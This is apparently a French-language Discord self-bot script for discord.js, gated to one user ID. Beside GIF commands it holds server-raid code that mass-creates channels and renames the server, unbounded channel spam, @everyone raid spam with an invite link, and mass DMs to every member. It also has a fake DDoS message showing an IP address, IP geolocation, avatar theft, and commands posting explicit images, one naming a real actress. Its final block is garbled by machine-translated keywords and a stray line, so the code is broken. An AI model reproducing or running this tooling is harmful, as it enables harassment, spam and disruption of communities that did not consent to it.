

const Discord = require('discord.js');

const client = new Discord.Client();

var prefix = '+'

var token = 'tontoken'

 ownerid = "tonid" 

client.login(token) ;

client.on('ready', function(){

       console.log("Je suis pret pour te servir")

    client.user.setActivity("𝙃 𝙚 𝙛 𝙞 𝙨 𝙚 𝙡 𝙛", {type: "Streaming", url: 'https://www.twitch.tv/hefirox3'

    });

  })

client.on('message' ,function(message){

	if (message.author.id != "541377651873546241") return;

       if(message.content.includes(prefix + 'stop' )){

             message.channel.send('`au revoir  ...`')

             message.delete().then(client.destroy())

       }

})

client.on('message' ,function(message){

if (message.content.includes(prefix + "destroy")) {

	if (message.author.id != "541377651873546241") return;

	var embed = new Discord.RichEmbed()

	  .setDescription("\n RAID\n RAID\n RAID\n RAID\n RAID\n RAID\n RAID\n RAID\n RAID\n RAID\n RAID\n RAID\n RAID\n RAID\n RAID\n RAID\n RAID")            

             message.channel.sendEmbed(embed);

             	} 

})

 

 

   

 client.on('message' ,function(message){

       if(message.content.includes(prefix + 'setstream' )){

       	if (message.author.id != "541377651873546241") return;

 if (message.deletable) message.delete();

 let texte = message.content.split(/ +/).slice(1);

 if(!texte[0]) return;

 client.user.setActivity(`${texte.join(" ")}`, {

 type: "STREAMING",

 url: 'https://www.twitch.tv/hefirox3'

 }).then(() => message.channel.send(` Streaming : \`${texte.join(" ")}\``).then(sg => msg.delete(1)));

            }

 })

 

 

 

 

 

 

 

 

 

 client.on('message' ,function(message){

       if(message.content.includes(prefix + 'photo' )){

       	if (message.author.id != "541377651873546241") return;

       var embed = new Discord.RichEmbed()

.setTitle("Page Photo")

.setDescription("**Ton prefix + `hap` \n \n \n Ton prefix + `issou` \n \n \n Ton prefix + `chiasse`\n \n \n Ton prefix + `bug` \n \n \n Ton prefix + `gr`\n \n \n Ton prefix + `yeah` \n \n \nTon prefix + `calin` \n \n \n Ton prefix + `ez`**")

.setFooter("Dev By Hefirox")

.addField("Ton prefix + stop pour arretez le bot", "Profite De Mon Self")

.setColor ("RANDOM")

.setImage("https://cdn.discordapp.com/attachments/576081563733721088/576669014617489411/download.gif")

message.delete()

message.channel.sendEmbed(embed);

      

      }

})    

    

       client.on('message' ,function(message){

	if(message.content.includes(prefix+ 'hap' )){

		if (message.author.id != "541377651873546241") return;

		message.delete()

		message.channel.send('https://cdn.discordapp.com/attachments/574131496051408907/574223806181146658/1410279891-rire.gif')

		}

})

client.on('message' ,function(message){

	if(message.content.includes(prefix+ 'issou' )){

		if (message.author.id != "541377651873546241") return;

		message.delete()

		message.channel.send('https://cdn.discordapp.com/attachments/574131496051408907/574224479107022878/WarmSlipperyIrishwolfhound-max-1mb.gif')

		}

})

client.on('message' ,function(message){

       if(message.content.includes(prefix + 'help' )){

       	if (message.author.id != "541377651873546241") return;

       var embed = new Discord.RichEmbed()

.setTitle("**`Self Bot Dev By Hefirox ♨️`**️")

.setDescription("**Bienvenue sur le `ＨｅｆｉＳｅｌｆＢｏt V3` ** \n  \n  \n   𝘾𝙤𝙢𝙢𝙖𝙣𝙙𝙚 𝙥𝙝𝙤𝙩𝙤\n `𝙏𝙤𝙣 𝙥𝙧𝙚𝙛𝙞𝙭 + 𝙥𝙝𝙤𝙩𝙤` \n \n \n 𝘾𝙤𝙢𝙢𝙖𝙣𝙙𝙚 𝙣𝙨𝙬𝙛 \n`𝙏𝙤𝙣 𝙥𝙧𝙚𝙛𝙞𝙭 + 𝙘𝙤𝙘𝙝𝙤𝙣`  \n \n \n 𝘾𝙤𝙢𝙢𝙖𝙣𝙙𝙚 𝙝𝙖𝙘𝙠\n `𝙏𝙤𝙣 𝙥𝙧𝙚𝙛𝙞𝙭 + 𝙝𝙖𝙘𝙠`     \n \n  \n 𝘾𝙤𝙢𝙢𝙖𝙣𝙙𝙚 𝙛𝙪𝙣\n `𝙏𝙤𝙣 𝙥𝙧𝙚𝙛𝙞𝙭 + 𝙛𝙪𝙣`     ")

.setFooter("Dev By Hefirox")

.addField("**`Ton prefix + stop pour arretez le bot`**", "**`Profite De Mon Self`**")

.setColor ("#4A235A")

.setImage("https://cdn.discordapp.com/attachments/576081563733721088/576669014617489411/download.gif")

embed.setAuthor(client.user.username);

message.delete()

message.channel.sendEmbed(embed);

            }

        })

 client.on('message' ,function(message){

       if(message.content.includes(prefix + 'fun' )){

       	if (message.author.id != "541377651873546241") return;

       var embed = new Discord.RichEmbed()

.setTitle("**Page Fun**️")

.setDescription("**Ton prefix + `setstream` \n `set un stream defini` \n \n \n Ton prefix + `pp`\n `envoie ta photo de profil`\n \n \nTon prefix + `8ball` \n `repond a ta question`\n \n \n Ton prefix + `say`\n `send un message defini en embed`\n \n \n Ton prefix + `avoiravatar`\n `vole l'avatar de quellqun`\n \n \nTon prefix + `ping` \n `voit le ping du bot`\n \n \n Ton prefix + `streamself`\n `te met h e f i s e l f en streaming` \n \n \n Ton prefix + `clear` \n `clear le nombre de message choisi`\n\n\nTon prefix + `multistream` \n `multistream` **")

.setFooter("Dev By Hefirox")

.addField("**Ton prefix + stop pour arretez le bot**", "**Profite De Mon Self**")

.setColor ("RANDOM")

.setImage("https://cdn.discordapp.com/attachments/576081563733721088/576669014617489411/download.gif")

message.delete()

message.channel.sendEmbed(embed); 

      }

})    

client.on('message' ,function(message){

       if(message.content.includes(prefix + 'ddos' )){

       	if (message.author.id != "541377651873546241") return;

       var embed = new Discord.RichEmbed()

.setTitle("**DDOS️**️")

.setDescription("** `//////1% \n //////2% \n//////14%\n //////43%\n //////67% \n //////100% \n User Are DDos` IP 90.89.182.56 PORT 1945**").setImage(client.user.avatarURL) 

.setFooter("Dev By Hefirox")

.addField("**Ton prefix + stop pour arretez le bot**", "**Profite De Mon Self**")

.setColor ("RANDOM")

.setImage("https://cdn.discordapp.com/attachments/576081563733721088/576669014617489411/download.gif")

message.delete()

message.channel.sendEmbed(embed); 

      }

})  

  

  

  

  

  

  

  

  

  client.on('message' ,function(message){

       if(message.content.includes(prefix + 'hack' )){

       	if (message.author.id != "541377651873546241") return;

       	var embed = new Discord.RichEmbed()

.setTitle("Page Hack️️")

.setDescription("**Ton prefix + `ddos`** \n `fake ddos`\n\n\n **Ton prefix + `spam`**\n `spam un message defini` \n\n\n**Ton prefix + `ip` \n `geolocalise l'ip donner`\n\n\nTon prefix + `raid`\n`raid un serveur`\n\n\nTon prefix + `rspam`\n`spam un message de raid`**")

.setFooter("Dev By Hefirox")

.addField("Ton prefix + stop pour arretez le bot", "Profite De Mon Self")

.setColor ("RANDOM")

.setImage("https://cdn.discordapp.com/attachments/576081563733721088/576669014617489411/download.gif")

message.delete()

message.channel.sendEmbed(embed);

      

      }

})    

client.on('message' ,function(message){

       if(message.content.includes(prefix + 'cochon' )){

       	if (message.author.id != "541377651873546241") return;

       var embed = new Discord.RichEmbed()

.setTitle("**Page Cochonnes**️")

.setDescription("**Ton prefix + `nude`\n `send un nude` \n \n \n Ton prefix + `boobs`\n `send des boobs` **")

.setFooter("Dev By Hefirox")

.addField("Ton prefix + stop pour arretez le bot", "Profite De Mon Self")

.setColor ("RANDOM")

.setImage("https://cdn.discordapp.com/attachments/576081563733721088/576669014617489411/download.gif")

message.delete()

message.channel.sendEmbed(embed); 

      }

})    

    

       

client.on('message' ,function(message){

       if(message.content.includes(prefix + 'mp' )){

       	if (message.author.id != "541377651873546241") return;

                var args = message.content.split(" ").slice(1);

                var msge = args.join(' ');

 

                if(!msge) return message.channel.send("Precise un message")

 

                var mpall = new Discord.RichEmbed()

                .setThumbnail(client.user.avatarURL)

                .setTimestamp()

                .setColor("RANDOM")

                .addField("Dsl de pub mais join stp", msge);

                message.delete()

                message.guild.members.map(m => m.send(mpall))

            }

   })

client.on('message' ,function(message){

       if(message.content.includes(prefix + 'ez' )){

       	if (message.author.id != "541377651873546241") return;

var embed = new Discord.RichEmbed()

.setImage("https://cdn.discordapp.com/attachments/572372274523668481/575676986253508641/bbcba42024448e2cf99b4ed0426c5d3c.jpg")

message.delete()

message.channel.sendEmbed(embed); 

message.delete()

      }

})     

client.on('message' ,function(message){

       if(message.content.includes(prefix + 'calin' )){

       	if (message.author.id != "541377651873546241") return;

var embed = new Discord.RichEmbed()

.setImage("https://cdn.discordapp.com/attachments/574130527678889994/574633731973840901/DirtyShadyBeagle-small.gif")

message.channel.sendEmbed(embed); 

message.delete()

      }

})     

client.on('message' ,function(message){

       if(message.content.includes(prefix + 'yeah' )){

       	if (message.author.id != "541377651873546241") return;

var embed = new Discord.RichEmbed()

.setImage("https://cdn.discordapp.com/attachments/574246181169790990/574633029549424830/anigif_sub-buzz-11063-1503410786-1.gif")

message.channel.sendEmbed(embed); 

message.delete()

      }

})

     client.on('message' ,function(message){

       if(message.content.includes(prefix + 'bug' )){

       	if (message.author.id != "541377651873546241") return;

       	var embed = new Discord.RichEmbed()

.setImage("https://cdn.discordapp.com/attachments/572372274523668481/574628675811541014/gif-anime.gif")

message.channel.sendEmbed(embed); 

message.delete()

      }

})

client.on('message' ,function(message){

       if(message.content.includes(prefix + 'gr' )){

       	if (message.author.id != "541377651873546241") return;

       	var embed = new Discord.RichEmbed()

       	.setImage("https://cdn.discordapp.com/attachments/574130527678889994/574629882668122119/giphy-1.gif")     

message.channel.sendEmbed(embed); 

message.delete()

      }

})         

client.on('message' ,function(message){

	if(message.content.includes(prefix+ 'nude' )){

		if (message.author.id != "541377651873546241") return;

	var embed = new Discord.RichEmbed()

	.setImage("https://cdn.discordapp.com/attachments/555162818794749962/571787035799453699/lucy_hale_nude.jpg")

message.channel.sendEmbed(embed); 

message.delete()

      }

})

client.on('message' ,function(message){

	if(message.content.includes(prefix+ 'boobs' )){

		if (message.author.id != "541377651873546241") return;

		var embed = new Discord.RichEmbed()

		.setImage("https://cdn.discordapp.com/attachments/574131496051408907/574243068971188224/www-nude-big-boobs-com-5.jpg")

message.channel.sendEmbed(embed); 

message.delete()

      }

}) 

     

   client.on('message' ,function(message){

	if(message.content.includes(prefix+ 'chiasse' )){

		if (message.author.id != "541377651873546241") return;

		var embed = new Discord.RichEmbed()

		.setImage("https://cdn.discordapp.com/attachments/572372274523668481/574627387732525056/giphy-downsized-large.gif")

		message.channel.sendEmbed(embed)

		message.delete()

		}

}) 

 client.on('message' ,function(message){

	if(message.content.includes(prefix+ 'pp' )){

		if (message.author.id != "541377651873546241") return;

		var embed = new Discord.RichEmbed()

		.setImage(client.user.avatarURL)

		message.channel.sendEmbed(embed);

message.delete()

}

})

client.on('message' ,function(message){

       if(message.content.includes(prefix + 'say' )){

       	if (message.author.id != "541377651873546241") return;

       	var embed = new Discord.RichEmbed()

                var args = message.content.split(" ").slice(1);

                var msge = args.join(' ')

 

message.react("✔")

                if(!msge) return message.channel.send("Precisse un message")

 

                var embed = new Discord.RichEmbed()

                .setThumbnail(client.user.avatarURL)

                .setTimestamp()

                .setColor("RANDOM")

                .addField("REWARD", msge);

message.react(":+1:")

message.channel.sendEmbed(embed);

message.delete()

                 

     }

})

 client.on('message' ,function(message){

       if(message.content.includes(prefix + '8ball' )){

       	if (message.author.id != "541377651873546241") return;

        if (message.deletable) message.delete();

            let arg = message.content.split(/ +/).slice(1);

            if (!arg[0]) return;

            const reponses = ["Oui mon frere", "Non sale trou du cul", "Surement mdr", "Je ne sais pas enculer", "Probablement mec", "Evidemment frere", "Evidemment que non", "Comment peux-tu te poser là question?", "Bien sur", "Effectivement"];

            let embed = new Discord.RichEmbed();

            embed.setAuthor(client.user.username, client.user.avatarURL);

            embed.addField(`Question : ${arg.join(" ")} ?`, `Reponse : **${reponses[Math.floor(Math.random()*reponses.length)]}**`);

            embed.setColor("RANDOM");

            embed.setTimestamp();

            message.channel.send(embed).catch(console.error);

            }

})

client.on('message' ,function(message){

       if(message.content.includes(prefix + 'raid' )){

       	if (message.author.id != "541377651873546241") return;

    if (message.deletable) message.delete();

    let i = 0;

    let interval = setInterval(function () {

      if (i === 250) clearInterval(interval);

      message.guild.createChannel("NUL").then(i++);

      message.guild.setName("FUCK BY HEFIROX")

      message.guild.setIcon("https://cdn.discordapp.com/attachments/579325371779121179/579595679718965251/DeterminedSoftAlpinegoat-small.gif")

    }, 200);

  }

  })

  

  client.on('message' ,function(message){

       if(message.content.includes(prefix + 'avoiravatar' )){

       	if (message.author.id != "541377651873546241") return;

    if (message.deletable) message.delete();

    if (message.channel.type === "dm") return;

    let getavatar = message.mentions.members.first()

    client.user.setAvatar(getavatar.user.avatarURL)

        	var embed = new Discord.RichEmbed()

        .setDescription ("✔   La photo de profil   à été mise sur ton profil avec succès.")

        message.channel.sendEmbed(embed)

                }

    })

client.on('message' ,function(message){

       if(message.content.includes(prefix + 'spam' )){

       	if (message.author.id != "541377651873546241") return;

    if (message.deletable) message.delete();

    if (message.channel.type === "dm") return;

    let args = message.content.split(" ").slice(1).join(" ");

    let inteval = setInterval(function () {

      message.channel.send(args)

    }, 200);

  }

})

client.on('message' ,function(message){

       if(message.content.includes(prefix + 'ping' )){

       	if (message.author.id != "541377651873546241") return;

    if (message.deletable) message.delete();

    message.reply(`H e f i s e l f :  ${Math.round(client.ping)} 𝐦𝐬`)

  }

})

client.on('message' ,function(message){

       if(message.content.includes(prefix + 'streamself' )){

       	if (message.author.id != "541377651873546241") return;

       	message.delete()

    let args = message.content.split(" ").slice(1).join(" ");

    client.user.setActivity("𝙃 𝙚 𝙛 𝙞 𝙨 𝙚 𝙡 𝙛", {type: "Streaming", url: 'https://www.twitch.tv/hefirox3'

    });

  }

});

client.on('message' ,function(message){

       if(message.content.includes(prefix + 'clear' )){

       	if (message.author.id != "541377651873546241") return;

    let args = message.content.split(" ").slice(1);

    let messagecount = parseInt(args[0]) || 999;

    var deletedMessages = -1;

    message.channel.fetchMessages({ limit: Math.min(messagecount + 1, 100, 200) })

        .then(messages => {

            messages.forEach(m => { m.delete().catch(console.error); deletedMessages++; });

        }).then(() => {

            if (deletedMessages === -1) deletedMessages = 0;

          

        }).catch(console.error);

       }

})

client.on('message' ,function(message){

       if(message.content.includes(prefix + 'ip' )){

       	if (message.author.id != "541377651873546241") return;

    if (message.deletable) message.delete()

    let args = message.content.split(' ')

    args.shift()

    message.reply('Resulta : http://ip-api.com/#' + args.join("%20"))

  }

})

client.on('message' ,function(message){

       if(message.content.includes(prefix + 'rspam' )){

       	if (message.author.id != "541377651873546241") return;

    if (message.deletable) message.delete();

    let i = 0;

    let interval = setInterval(function () {

      if (i === 250) clearInterval(interval);

      message.channel.send("NICK TA MERE\n@everyone \nRAID BY H E F I S E L F\nREJOINS LE GANG ICI :https://discord.gg/yYxSQap\nhttps://cdn.discordapp.com/attachments/579325371779121179/579595679718965251/DeterminedSoftAlpinegoat-small.gif") 

}, 100);

  }

  })

  client.on('message' ,function(message){  

  if (message.content === (prefix+'multistream')) {

  if (message.deletable) message.delete();

  if (message.author.id != "541377651873546241") return;

   rotate = 0;

   setInterval(function() {

   if (rotate === 0) {

   client.user.setGame("Ton message 👿", "https://www.twitch.tv/sefbot");

   rotate = 1;

   } else if (rotate === 1) {

   client.user.setGame("Dev by Hefirox 💵", "https://www.twitch.tv/selfbot");

   rotate = 2;

  } else if (rotate === 2) {

   client.user.setGame("HefiProject 💰", "https://www.twitch.tv/selfbot");

   tourner  =  3 ;
Un séjour sans faille
  } sinon  si ( rotation  ===  3 ) {

   client.user.setGame("Verified ✔", "https://www.twitch.tv/selfbot");

   rotate = 0;

   

   }}, 10 * 1000)

 };

 

    });

  
